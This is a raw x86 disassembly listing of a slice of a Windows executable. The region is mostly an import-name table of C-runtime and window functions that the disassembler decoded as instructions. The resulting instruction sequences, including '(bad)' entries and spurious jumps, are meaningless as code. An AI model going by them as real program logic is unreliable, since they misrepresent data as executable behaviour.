  412812:	add    DWORD PTR [eax],eax
  412814:	mov    dl,0x34
  412816:	add    DWORD PTR [eax],eax
  412818:	enter  0x134,0x0
  41281c:	fidiv  DWORD PTR [ecx+eax*1]
  41281f:	add    dh,ah
  412821:	xor    al,0x1
  412823:	add    dl,bh
  412825:	xor    al,0x1
  412827:	add    BYTE PTR [esi*1+0x350e0001],al
  41282e:	add    DWORD PTR [eax],eax
  412830:	push   ds
  412831:	xor    eax,0x35360001
  412836:	add    DWORD PTR [eax],eax
  412838:	dec    edx
  412839:	xor    eax,0x355a0001
  41283e:	add    DWORD PTR [eax],eax
  412840:	xor    ax,0x1
  412844:	je     0x41287b
  412846:	add    DWORD PTR [eax],eax
  412848:	mov    dh,BYTE PTR ds:0x359c0001
  41284e:	add    DWORD PTR [eax],eax
  412850:	add    BYTE PTR [eax],al
  412852:	add    BYTE PTR [eax],al
  412854:	mov    edx,0xce000135
  412859:	xor    eax,0x35e00001
  41285e:	add    DWORD PTR [eax],eax
  412860:	in     al,dx
  412861:	xor    eax,0x36040001
  412866:	add    DWORD PTR [eax],eax
  412868:	adc    al,0x36
  41286a:	add    DWORD PTR [eax],eax
  41286c:	sub    BYTE PTR [esi],dh
  41286e:	add    DWORD PTR [eax],eax
  412870:	ds add DWORD PTR ss:[eax],eax
  412874:	dec    esi
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	pusha  
  412879:	add    DWORD PTR ss:[eax],eax
  41287c:	ins    BYTE PTR es:[edi],dx
  41287d:	add    DWORD PTR ss:[eax],eax
  412880:	xor    BYTE PTR [esi],0x1
  412883:	add    BYTE PTR [esi-0x49fffeca],bl
  412889:	add    DWORD PTR ss:[eax],eax
  41288c:	retf   0x136
  41288f:	add    dl,bl
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	out    0x36,al
  412896:	add    DWORD PTR [eax],eax
  412898:	(bad)  
  412899:	add    DWORD PTR ss:[eax],eax
  41289c:	adc    BYTE PTR [edi],dh
  41289e:	add    DWORD PTR [eax],eax
  4128a0:	and    dh,BYTE PTR [edi]
  4128a2:	add    DWORD PTR [eax],eax
  4128a4:	xor    dh,BYTE PTR [edi]
  4128a6:	add    DWORD PTR [eax],eax
  4128a8:	inc    esp
  4128a9:	aaa    
  4128aa:	add    DWORD PTR [eax],eax
  4128ac:	push   eax
  4128ad:	aaa    
  4128ae:	add    DWORD PTR [eax],eax
  4128b0:	pusha  
  4128b1:	aaa    
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	outs   dx,BYTE PTR ds:[esi]
  4128b5:	aaa    
  4128b6:	add    DWORD PTR [eax],eax
  4128b8:	js     0x4128f1
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	mov    BYTE PTR [edi],dh
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	xchg   esi,eax
  4128c1:	aaa    
  4128c2:	add    DWORD PTR [eax],eax
  4128c4:	test   al,0x37
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	mov    esi,0xd2000137
  4128cd:	aaa    
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	jmp    0x138:0x137
  4128d7:	add    BYTE PTR [esi],cl
  4128d9:	cmp    BYTE PTR [ecx],al
  4128db:	add    BYTE PTR [esi],ah
  4128dd:	cmp    BYTE PTR [ecx],al
  4128df:	add    BYTE PTR [eax+edi*1],bh
  4128e2:	add    DWORD PTR [eax],eax
  4128e4:	dec    esp
  4128e5:	cmp    BYTE PTR [ecx],al
  4128e7:	add    BYTE PTR [eax+0x38],bl
  4128ea:	add    DWORD PTR [eax],eax
  4128ec:	jo     0x412926
  4128ee:	add    DWORD PTR [eax],eax
  4128f0:	jle    0x41292a
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	xchg   edx,eax
  4128f5:	cmp    BYTE PTR [ecx],al
  4128f7:	add    BYTE PTR [esi-0x51fffec8],bl
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    dh,al
  412901:	cmp    BYTE PTR [ecx],al
  412903:	add    dl,bl
  412905:	cmp    BYTE PTR [ecx],al
  412907:	add    al,ch
  412909:	cmp    BYTE PTR [ecx],al
  41290b:	add    dh,bh
  41290d:	cmp    BYTE PTR [ecx],al
  41290f:	add    BYTE PTR [edx],dl
  412911:	cmp    DWORD PTR [ecx],eax
  412913:	add    BYTE PTR [esi],bl
  412915:	cmp    DWORD PTR [ecx],eax
  412917:	add    BYTE PTR [eax],bh
  412919:	cmp    DWORD PTR [ecx],eax
  41291b:	add    BYTE PTR [eax],al
  41291d:	add    BYTE PTR [eax],al
  41291f:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412923:	add    BYTE PTR [edx+0x39],dh
  412926:	add    DWORD PTR [eax],eax
  412928:	add    BYTE PTR [eax],al
  41292a:	add    BYTE PTR [eax],al
  41292c:	xchg   edi,eax
  41292d:	add    ebp,DWORD PTR [ecx+0x73]
  412930:	imul   esp,DWORD PTR fs:[edi+0x69],0x41f0074
  412938:	ja     0x41299d
  41293a:	jae    0x41299f
  41293c:	ins    DWORD PTR es:[edi],dx
  41293d:	jo     0x41293f
  41293f:	add    ch,dh
  412941:	add    BYTE PTR [edi+0x63],bl
  412944:	outs   dx,DWORD PTR ds:[esi]
  412945:	outs   dx,BYTE PTR ds:[esi]
  412946:	je     0x4129ba
  412948:	outs   dx,DWORD PTR ds:[esi]
  412949:	ins    BYTE PTR es:[edi],dx
  41294a:	data16 jo 0x41294d
  41294d:	add    BYTE PTR [ebp+0x74656703],cl
  412953:	outs   dx,BYTE PTR gs:[esi]
  412955:	jbe    0x412957
  412957:	add    BYTE PTR ds:0x73637704,ch
  41295d:	jb     0x4129c2
  41295f:	push   0x3f20072
  412964:	jae    0x4129da
  412966:	jb     0x4129d6
  412968:	arpl   WORD PTR [eax+0x79],si
  41296b:	add    al,ch
  41296d:	add    esi,DWORD PTR [ebx+0x74]
  412970:	jb     0x4129d5
  412972:	jo     0x4129ed
  412974:	add    BYTE PTR [eax],al
  412976:	mov    bl,0x0
  412978:	pop    edi
  412979:	pop    edi
  41297a:	jae    0x4129e1
  41297c:	je     0x4129dd
  41297e:	popa   
  41297f:	jo     0x4129f1
  412981:	pop    edi
  412982:	je     0x4129fd
  412984:	jo     0x4129eb
  412986:	add    BYTE PTR [eax],al
  412988:	lds    eax,FWORD PTR [ebx]
  41298a:	jo     0x4129fe
  41298c:	imul   ebp,DWORD PTR [esi+0x74],0xcc000066
  412993:	add    esi,DWORD PTR [ecx+0x73]
  412996:	outs   dx,DWORD PTR ds:[esi]
  412997:	jb     0x412a0d
  412999:	add    BYTE PTR [edx+0x3],dh
  41299c:	data16 ins BYTE PTR es:[edi],dx
  41299e:	outs   dx,DWORD PTR ds:[esi]
  41299f:	outs   dx,DWORD PTR ds:[esi]
  4129a0:	jb     0x4129a2
  4129a2:	lods   al,BYTE PTR ds:[esi]
  4129a3:	add    ebp,DWORD PTR [ecx+0x73]
  4129a6:	js     0x412a0c
  4129a8:	imul   esp,DWORD PTR [edi+0x69],0xa0000074
  4129af:	add    BYTE PTR [edi+0x5f],bl
  4129b2:	jo     0x412a13
  4129b4:	pop    edi
  4129b5:	ins    WORD PTR es:[edi],dx
  4129b7:	outs   dx,DWORD PTR ds:[esi]
  4129b8:	fs add BYTE PTR gs:[eax],al
  4129bc:	xor    eax,0x73637704
  4129c1:	je     0x412a32
  4129c3:	ins    BYTE PTR es:[edi],dx
  4129c4:	add    BYTE PTR [eax],al
  4129c6:	or     al,0x4
  4129c8:	je     0x412a39
  4129ca:	ja     0x412a41
  4129cc:	jo     0x412a3e
  4129ce:	gs jb  0x4129d1
  4129d1:	add    cl,dh
  4129d3:	add    esi,DWORD PTR [ebx+0x74]
  4129d6:	jb     0x412a46
  4129d8:	arpl   WORD PTR [ebp+0x70],bp
  4129db:	add    BYTE PTR [ebx+0x705f5f00],bl
  4129e1:	pop    edi
  4129e2:	pop    edi
  4129e3:	arpl   WORD PTR [edi+0x6d],bp
  4129e6:	ins    DWORD PTR es:[edi],dx
  4129e7:	outs   dx,DWORD PTR ds:[esi]
  4129e8:	fs add BYTE PTR gs:[eax],al
  4129ec:	push   es
  4129ed:	add    al,0x74
  4129ef:	imul   ebp,DWORD PTR [ebp+0x65],0x38b0000
  4129f6:	addr16 gs je 0x412a5d
  4129fa:	add    BYTE PTR [eax],al
  4129fc:	xor    eax,DWORD PTR [edi+esi*2]
  4129ff:	arpl   WORD PTR [ebx+0x74],si
  412a02:	outs   dx,DWORD PTR ds:[esi]
  412a03:	imul   eax,DWORD PTR [eax],0x0
  412a06:	test   eax,0x77736903
  412a0b:	jae    0x412a7d
  412a0d:	popa   
  412a0e:	arpl   WORD PTR [ebp+0x0],sp
  412a11:	add    BYTE PTR [ebx+0x77736903],ch
  412a17:	js     0x412a7d
  412a19:	imul   esp,DWORD PTR [edi+0x69],0xdb0074
  412a20:	pop    edi
  412a21:	popa   
  412a22:	ins    DWORD PTR es:[edi],dx
  412a23:	jae    0x412a8c
  412a25:	pop    edi
  412a26:	gs js  0x412a92
  412a29:	je     0x412a2b
  412a2b:	add    BYTE PTR [ecx],ah
  412a2d:	add    al,0x77
  412a2f:	arpl   WORD PTR [ebx+0x63],si
  412a32:	jo     0x412aad
  412a34:	add    BYTE PTR [eax],al
  412a36:	xchg   BYTE PTR [ecx],al
  412a38:	pop    edi
  412a39:	imul   ebp,DWORD PTR [esi+0x69],0x72657474
  412a40:	ins    DWORD PTR es:[edi],dx
  412a41:	add    BYTE PTR [ebx+eax*1+0x6c617369],dl
  412a48:	outs   dx,BYTE PTR ds:[esi]
  412a49:	jne    0x412ab8
  412a4b:	add    ch,dh
  412a4d:	add    esi,DWORD PTR [ebx+0x74]
  412a50:	jb     0x412ac2
  412a52:	bound  esi,QWORD PTR [edx+0x6b]
  412a55:	add    BYTE PTR [esi+0x73695f01],bl
  412a5b:	ins    DWORD PTR es:[edi],dx
  412a5c:	bound  esp,QWORD PTR [edx+0x6c]
  412a5f:	gs popa 
  412a61:	add    BYTE PTR fs:[eax],al
  412a64:	sbb    BYTE PTR [esi+esi*2],al
  412a67:	jae    0x412ae0
  412a69:	jo     0x412add
  412a6b:	imul   ebp,DWORD PTR [esi+0x74],0x36d0066
  412a72:	data16 addr16 gs je 0x412ada
  412a77:	add    BYTE PTR [edx+0x0],dl
  412a7a:	pop    edi
  412a7b:	pop    eax
  412a7c:	arpl   WORD PTR [eax+0x74],si
  412a7f:	inc    esi
  412a80:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x4290072
  412a88:	ja     0x412aed
  412a8a:	jae    0x412afa
  412a8c:	arpl   WORD PTR [eax+0x79],si
  412a8f:	add    BYTE PTR [ebx],ah
  412a91:	add    DWORD PTR [edi+0x65],ebx
  412a94:	js     0x412aff
  412a96:	je     0x412a98
  412a98:	imul   eax,DWORD PTR [ebx],0x6f6c6366
  412a9e:	jae    0x412b05
  412aa0:	add    BYTE PTR [eax],al
  412aa2:	call   0x65a489a7
  412aa7:	js     0x412b12
  412aa9:	je     0x412aab
  412aab:	add    bh,al
  412aad:	add    esi,DWORD PTR [eax+0x75]
  412ab0:	je     0x412b15
  412ab2:	add    BYTE PTR [eax],al
  412ab4:	fadd   DWORD PTR [ebx]
  412ab6:	jae    0x412b1d
  412ab8:	je     0x412b26
  412aba:	outs   dx,DWORD PTR ds:[esi]
  412abb:	arpl   WORD PTR [ecx+0x6c],sp
  412abe:	add    BYTE PTR gs:[ebp+0x735f5f00],dh
  412ac5:	gs je  0x412b3d
  412ac8:	jae    0x412b2f
  412aca:	jb     0x412b39
  412acc:	popa   
  412acd:	je     0x412b37
  412acf:	gs jb  0x412b44
  412ad2:	add    BYTE PTR [eax],al
  412ad4:	mov    BYTE PTR [ebx],al
  412ad6:	data16 ja 0x412b4b
  412ad9:	imul   esi,DWORD PTR [ebp+eiz*2+0x0],0x7003c300
  412ae1:	gs jb  0x412b56
  412ae4:	outs   dx,DWORD PTR ds:[esi]
  412ae5:	jb     0x412ae7
  412ae7:	add    BYTE PTR [edx+0x3],bl
  412aea:	popa   
  412aeb:	je     0x412b5c
  412aed:	ins    BYTE PTR es:[edi],dx
  412aee:	add    BYTE PTR [eax],al
  412af0:	jb     0x412af2
  412af2:	pop    edi
  412af3:	pop    edi
  412af4:	addr16 gs je 0x412b65
  412af8:	popa   
  412af9:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  412b00:	sub    BYTE PTR [edi+esi*2],al
  412b03:	arpl   WORD PTR [ebx+0x6e],si
  412b06:	arpl   WORD PTR [ebp+0x70],bp
  412b09:	add    dl,dl
  412b0b:	add    esi,DWORD PTR [edx+0x65]
  412b0e:	ins    DWORD PTR es:[edi],dx
  412b0f:	outs   dx,DWORD PTR ds:[esi]
  412b10:	jbe    0x412b77
  412b12:	add    BYTE PTR [eax],al
  412b14:	dec    ebp
  412b15:	push   ebx
  412b16:	push   esi
  412b17:	inc    ebx
  412b18:	push   edx
  412b19:	push   esp
  412b1a:	cs fs ins BYTE PTR es:[edi],dx
  412b1d:	ins    BYTE PTR es:[edi],dx
  412b1e:	add    BYTE PTR [eax],al
  412b20:	mov    edi,0x636f4c01
  412b25:	imul   edx,DWORD PTR [edi+0x69],0x6e
  412b29:	outs   dx,DWORD PTR fs:[esi]
  412b2b:	ja     0x412b82
  412b2d:	jo     0x412b93
  412b2f:	popa   
  412b30:	je     0x412b97
  412b32:	add    BYTE PTR [eax],al
  412b34:	nop
  412b35:	add    dl,BYTE PTR [edx+esi*2+0x61]
  412b39:	arpl   WORD PTR [ebx+0x50],bp
  412b3c:	outs   dx,DWORD PTR ds:[esi]
  412b3d:	jo     0x412bb4
  412b3f:	jo     0x412b8e
  412b41:	outs   dx,BYTE PTR gs:[esi]
  412b43:	jne    0x412b45
  412b45:	add    BYTE PTR [eax],bh
  412b47:	add    dl,BYTE PTR [ebx+0x65]
  412b4a:	je     0x412b8f
  412b4c:	jne    0x412bc0
  412b4e:	jae    0x412bbf
  412b50:	jb     0x412b52
  412b52:	mov    eax,ds:0x57734901
  412b57:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  412b5e:	popa   
  412b5f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  412b63:	add    BYTE PTR [ecx+0x536e4901],al
  412b69:	outs   dx,BYTE PTR gs:[esi]
  412b6b:	fs dec ebp
  412b6d:	gs jae 0x412be3
  412b70:	popa   
  412b71:	addr16 gs inc ebp
  412b74:	js     0x412b76
  412b76:	xchg   ebx,eax
  412b77:	add    BYTE PTR [ebp+eiz*2+0x73],al
  412b7b:	je     0x412bef
  412b7d:	outs   dx,DWORD PTR ds:[esi]
  412b7e:	jns    0x412bc1
  412b80:	arpl   WORD PTR [ebx+0x65],sp
  412b83:	ins    BYTE PTR es:[edi],dx
  412b84:	gs jb  0x412be8
  412b87:	je     0x412bf8
  412b89:	jb     0x412bdf
  412b8b:	popa   
  412b8c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412b90:	adc    eax,DWORD PTR [ecx]
  412b92:	inc    edi
  412b93:	gs je  0x412bda
  412b96:	outs   dx,DWORD PTR ds:[esi]
  412b97:	jne    0x412bfb
  412b99:	ins    BYTE PTR es:[edi],dx
  412b9a:	gs inc ebx
  412b9c:	ins    BYTE PTR es:[edi],dx
  412b9d:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  412ba4:	add    BYTE PTR [eax],al
  412ba6:	mov    ds:0x57734901,eax
  412bab:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  412bb2:	jae    0x412c1d
  412bb4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412bb8:	mov    al,0x1
  412bba:	dec    esp
  412bbb:	outs   dx,DWORD PTR ds:[esi]
  412bbc:	popa   
  412bbd:	fs dec ecx
  412bbf:	arpl   WORD PTR [edi+0x6e],bp
  412bc2:	push   edi
  412bc3:	add    BYTE PTR [ebp+0x79656b02],bh
  412bc9:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  412bcd:	jbe    0x412c34
  412bcf:	outs   dx,BYTE PTR ds:[esi]
  412bd0:	je     0x412bd2
  412bd2:	test   eax,0x616f4c01
  412bd7:	fs inc edx
  412bd9:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x58004170
  412be1:	add    dl,BYTE PTR [ebx+0x65]
  412be4:	je     0x412c38
  412be6:	arpl   WORD PTR gs:[eax+eax*1-0x1e],si
  412beb:	add    BYTE PTR [esi+0x69],al
  412bee:	outs   dx,BYTE PTR ds:[esi]
  412bef:	fs push edi
  412bf1:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412bf8:	inc    ecx
  412bf9:	add    cl,bh
  412bfb:	add    BYTE PTR [edi+0x65],al
  412bfe:	je     0x412c43
  412c00:	ins    BYTE PTR es:[edi],dx
  412c01:	popa   
  412c02:	jae    0x412c77
  412c04:	dec    esp
  412c05:	outs   dx,DWORD PTR ds:[esi]
  412c06:	outs   dx,BYTE PTR ds:[esi]
  412c07:	addr16 push edi
  412c09:	add    BYTE PTR ds:0x6e655302,ah
  412c0f:	fs dec ecx
  412c11:	outs   dx,BYTE PTR ds:[esi]
  412c12:	jo     0x412c89
  412c14:	je     0x412c16
  412c16:	cdq    
  412c17:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412c1b:	ins    BYTE PTR es:[edi],dx
  412c1c:	outs   dx,DWORD PTR ds:[esi]
  412c1d:	addr16 inc edx
  412c1f:	outs   dx,DWORD PTR ds:[esi]
  412c20:	js     0x412c6b
  412c22:	outs   dx,BYTE PTR ds:[esi]
  412c23:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  412c2b:	jb     0x412c8e
  412c2d:	ins    DWORD PTR es:[edi],dx
  412c2e:	inc    ecx
  412c2f:	add    BYTE PTR [edi+0x70737702],bh
  412c35:	jb     0x412ca0
  412c37:	outs   dx,BYTE PTR ds:[esi]
  412c38:	je     0x412ca0
  412c3a:	inc    ecx
  412c3b:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  412c42:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x654700f8
  412c4a:	je     0x412c8f
  412c4c:	ins    BYTE PTR es:[edi],dx
  412c4d:	popa   
  412c4e:	jae    0x412cc3
  412c50:	dec    esp
  412c51:	outs   dx,DWORD PTR ds:[esi]
  412c52:	outs   dx,BYTE PTR ds:[esi]
  412c53:	addr16 inc ecx
  412c55:	add    BYTE PTR [ecx+eax*1+0x63497349],bl
  412c5c:	outs   dx,DWORD PTR ds:[esi]
  412c5d:	outs   dx,BYTE PTR ds:[esi]
  412c5e:	imul   esp,DWORD PTR [ebx+0x0],0x47014200
  412c65:	gs je  0x412cb6
  412c68:	gs js  0x412cdf
  412c6b:	inc    esp
  412c6c:	ins    BYTE PTR es:[edi],dx
  412c6d:	addr16 inc edi
  412c6f:	jb     0x412ce0
  412c71:	jne    0x412ce3
  412c73:	dec    ecx
  412c74:	je     0x412cdb
  412c76:	ins    DWORD PTR es:[edi],dx
  412c77:	add    BYTE PTR [ebx+0x61724400],dh
  412c7d:	ja     0x412cc8
  412c7f:	arpl   WORD PTR [edi+0x6e],bp
  412c82:	add    BYTE PTR [eax],al
  412c84:	jmp    0x65b17b8a
  412c89:	outs   dx,BYTE PTR ds:[esi]
  412c8a:	dec    ecx
  412c8b:	outs   dx,BYTE PTR ds:[esi]
  412c8c:	jo     0x412d03
  412c8e:	je     0x412cd4
  412c90:	gs jae 0x412cfe
  412c93:	je     0x412d04
  412c95:	jo     0x412c97
  412c97:	add    dh,bh
  412c99:	add    BYTE PTR [edi+0x65],al
  412c9c:	je     0x412ce1
  412c9e:	ins    BYTE PTR es:[edi],dx
  412c9f:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  412ca6:	jb     0x412ca8
  412ca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ca9:	add    DWORD PTR [ecx+0x73],ecx
  412cac:	pop    edx
  412cad:	outs   dx,DWORD PTR ds:[esi]
  412cae:	outs   dx,DWORD PTR ds:[esi]
  412caf:	ins    DWORD PTR es:[edi],dx
  412cb0:	gs add BYTE PTR fs:[eax],al
  412cb4:	rol    DWORD PTR [eax],0x45
  412cb7:	outs   dx,BYTE PTR ds:[esi]
  412cb8:	popa   
  412cb9:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cbd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412cc4:	sub    BYTE PTR [eax],al
  412cc6:	inc    ebx
  412cc7:	push   0x6f4c7261
  412ccc:	ja     0x412d33
  412cce:	jb     0x412d12
  412cd0:	jne    0x412d38
  412cd2:	push   di
  412cd4:	add    BYTE PTR [eax],al
  412cd6:	inc    ebx
  412cd7:	add    BYTE PTR [ebx+0x6c],al
  412cda:	imul   esp,DWORD PTR [ebp+0x6e],0x536f5474
  412ce1:	arpl   WORD PTR [edx+0x65],si
  412ce4:	outs   dx,BYTE PTR gs:[esi]
  412ce6:	add    BYTE PTR [eax],al
  412ce8:	add    eax,DWORD PTR [eax]
  412cea:	inc    ecx
  412ceb:	fs push 0x75
  412cee:	jae    0x412d64
  412cf0:	push   edi
  412cf1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  412cf8:	arpl   WORD PTR [ebp+eax*2+0x78],si
  412cfc:	add    BYTE PTR [eax],al
  412cfe:	icebp  
  412cff:	add    DWORD PTR [eax+0x6f],edx
  412d02:	jae    0x412d78
  412d04:	dec    ebp
  412d05:	gs jae 0x412d7b
  412d08:	popa   
  412d09:	addr16 gs inc ecx
  412d0c:	add    BYTE PTR [eax],al
  412d0e:	out    dx,al
  412d0f:	add    DWORD PTR [eax+0x65],edx
  412d12:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  412d17:	jae    0x412d7a
  412d19:	addr16 gs inc ecx
  412d1c:	add    BYTE PTR [eax],al
  412d1e:	dec    ebx
  412d1f:	add    DWORD PTR [edi+0x65],eax
  412d22:	je     0x412d74
  412d24:	jb     0x412d95
  412d26:	jo     0x412d7f
  412d28:	add    BYTE PTR [eax],al
  412d2a:	inc    esi
  412d2b:	add    BYTE PTR [ebx+0x6c],al
  412d2e:	outs   dx,DWORD PTR ds:[esi]
  412d2f:	jae    0x412d96
  412d31:	inc    esp
  412d32:	gs jae 0x412da0
  412d35:	je     0x412da6
  412d37:	jo     0x412d39
  412d39:	add    cl,cl
  412d3b:	add    DWORD PTR [ebp+0x61],ecx
  412d3e:	jo     0x412d97
  412d40:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  412d47:	imul   ebp,DWORD PTR [esi+0x74],0x2020073
  412d4e:	push   edx
  412d4f:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  412d58:	popa   
  412d59:	jae    0x412dce
  412d5b:	inc    ecx
  412d5c:	add    BYTE PTR [eax],al
  412d5e:	mov    es,WORD PTR [ecx]
  412d60:	dec    ecx
  412d61:	jae    0x412da6
  412d63:	push   0x6c417261
  412d68:	jo     0x412dd2
  412d6a:	popa   
  412d6b:	dec    esi
  412d6c:	jne    0x412ddb
  412d6e:	gs jb  0x412dda
  412d71:	arpl   WORD PTR [edi+0x0],dx
  412d74:	mov    cl,0x1
  412d76:	dec    esp
  412d77:	outs   dx,DWORD PTR ds:[esi]
  412d78:	popa   
  412d79:	fs dec ecx
  412d7b:	ins    DWORD PTR es:[edi],dx
  412d7c:	popa   
  412d7d:	addr16 gs inc ecx
  412d80:	add    BYTE PTR [eax],al
  412d82:	sahf   
  412d83:	add    DWORD PTR [ecx+0x73],ecx
  412d86:	push   edx
  412d87:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412d8c:	jo     0x412e02
  412d8e:	jns    0x412d90
  412d90:	mov    es,WORD PTR [edx]
  412d92:	push   esp
  412d93:	outs   dx,DWORD PTR ds:[esi]
  412d94:	push   ebp
  412d95:	outs   dx,BYTE PTR ds:[esi]
  412d96:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  412d9d:	add    BYTE PTR [ebx],bh
  412d9f:	add    DWORD PTR [edi+0x65],eax
  412da2:	je     0x412df1
  412da4:	gs jae 0x412e1a
  412da7:	popa   
  412da8:	addr16 gs inc ebp
  412dab:	js     0x412e21
  412dad:	jb     0x412e10
  412daf:	dec    ecx
  412db0:	outs   dx,BYTE PTR ds:[esi]
  412db1:	outs   dx,WORD PTR ds:[esi]
  412db3:	add    BYTE PTR [ebp+0x1],al
  412db6:	inc    edi
  412db7:	gs je  0x412e0a
  412dba:	popa   
  412dbb:	jb     0x412e22
  412dbd:	outs   dx,BYTE PTR ds:[esi]
  412dbe:	je     0x412dc0
  412dc0:	bound  eax,QWORD PTR [eax]
  412dc2:	inc    ebx
  412dc3:	jb     0x412e2a
  412dc5:	popa   
  412dc6:	je     0x412e2d
  412dc8:	push   edi
  412dc9:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412dd0:	inc    ecx
  412dd1:	add    BYTE PTR [ecx+0x766e4901],cl
  412dd7:	popa   
  412dd8:	ins    BYTE PTR es:[edi],dx
  412dd9:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  412de1:	je     0x412de3
  412de3:	add    BYTE PTR [ebp+0x2],ch
  412de6:	push   ebx
  412de7:	gs je  0x412e41
  412dea:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412df1:	outs   dx,BYTE PTR ds:[esi]
  412df2:	addr16 inc ecx
  412df4:	add    BYTE PTR [eax],al
  412df6:	adc    eax,0x6c655202
  412dfb:	gs popa 
  412dfd:	jae    0x412e64
  412dff:	inc    esp
  412e00:	inc    ebx
  412e01:	add    BYTE PTR [eax+eax*1],ah
  412e04:	inc    ebx
  412e05:	push   0x65676e61
  412e0a:	dec    ebp
  412e0b:	outs   dx,BYTE PTR gs:[esi]
  412e0d:	jne    0x412e66
  412e0f:	add    BYTE PTR [ebx],bh
  412e11:	add    BYTE PTR [ebx+0x68],al
  412e14:	arpl   WORD PTR gs:[ebx+0x4d],bp
  412e18:	outs   dx,BYTE PTR gs:[esi]
  412e1a:	jne    0x412e65
  412e1c:	je     0x412e83
  412e1e:	ins    DWORD PTR es:[edi],dx
  412e1f:	add    al,ch
  412e21:	add    DWORD PTR [edi+0x70],ecx
  412e24:	outs   dx,BYTE PTR gs:[esi]
  412e26:	dec    ecx
  412e27:	arpl   WORD PTR [edi+0x6e],bp
  412e2a:	add    BYTE PTR [eax],al
  412e2c:	mov    ds:0x57734901,al
  412e31:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  412e38:	imul   esp,DWORD PTR [ebx+0x6f],0xce006564
  412e3f:	add    DWORD PTR [ebp+0x65],ecx
  412e42:	jae    0x412eb7
  412e44:	popa   
  412e45:	addr16 gs inc edx
  412e48:	outs   dx,DWORD PTR ds:[esi]
  412e49:	js     0x412e8c
  412e4b:	add    BYTE PTR [ebp+0x61724400],dh
  412e51:	ja     0x412ea0
  412e53:	outs   dx,BYTE PTR gs:[esi]
  412e55:	jne    0x412e99
  412e57:	popa   
  412e58:	jb     0x412e5a
  412e5a:	inc    edx
  412e5b:	add    dl,BYTE PTR [ebx+0x65]
  412e5e:	je     0x412ea6
  412e60:	outs   dx,DWORD PTR ds:[esi]
  412e61:	jb     0x412ec8
  412e63:	addr16 jb 0x412ed5
  412e66:	jne    0x412ed6
  412e68:	fs push edi
  412e6a:	imul   ebp,DWORD PTR [esi+0x64],0xc200776f
  412e71:	add    dh,BYTE PTR [edi+0x76]
  412e74:	jae    0x412ee6
  412e76:	jb     0x412ee1
  412e78:	outs   dx,BYTE PTR ds:[esi]
  412e79:	je     0x412ee1
  412e7b:	push   edi
  412e7c:	add    BYTE PTR [eax],al
  412e7e:	mov    al,ds:0x57734901
  412e83:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412e8a:	push   ebp
  412e8b:	add    DWORD PTR [edi+0x65],eax
  412e8e:	je     0x412ee3
  412e90:	arpl   WORD PTR [edx+0x6f],si
  412e93:	ins    BYTE PTR es:[edi],dx
  412e94:	ins    BYTE PTR es:[edi],dx
  412e95:	push   eax
  412e96:	outs   dx,DWORD PTR ds:[esi]
  412e97:	jae    0x412e99
  412e99:	add    al,dh
  412e9b:	add    BYTE PTR [edi+0x65],al
  412e9e:	je     0x412ee1
  412ea0:	jae    0x412f1b
  412ea2:	outs   dx,BYTE PTR ds:[esi]
  412ea3:	arpl   WORD PTR [ebx+0x65],cx
  412ea6:	jns    0x412efb
  412ea8:	je     0x412f0b
  412eaa:	je     0x412f11
  412eac:	add    BYTE PTR [eax],al
  412eae:	or     eax,0x74654701
  412eb3:	inc    esp
  412eb4:	imul   esp,DWORD PTR [ecx+0x6c],0x6142676f
  412ebb:	jae    0x412f22
  412ebd:	push   ebp
  412ebe:	outs   dx,BYTE PTR ds:[esi]
  412ebf:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x5502a500
  412ec7:	jo     0x412f2d
  412ec9:	popa   
  412eca:	je     0x412f31
  412ecc:	push   edi
  412ecd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412ed4:	or     eax,DWORD PTR [ecx]
  412ed6:	inc    edi
  412ed7:	gs je  0x412f1e
  412eda:	inc    ebx
  412edb:	inc    ebp
  412edc:	js     0x412ede
  412ede:	stos   DWORD PTR es:[edi],eax
  412edf:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412ee3:	fs inc ebx
  412ee5:	jne    0x412f59
  412ee7:	jae    0x412f58
  412ee9:	jb     0x412f2c
  412eeb:	add    BYTE PTR [edx+eax*1+0x53],bl
  412eef:	gs je  0x412f45
  412ef2:	arpl   WORD PTR [edx+0x6f],si
  412ef5:	ins    BYTE PTR es:[edi],dx
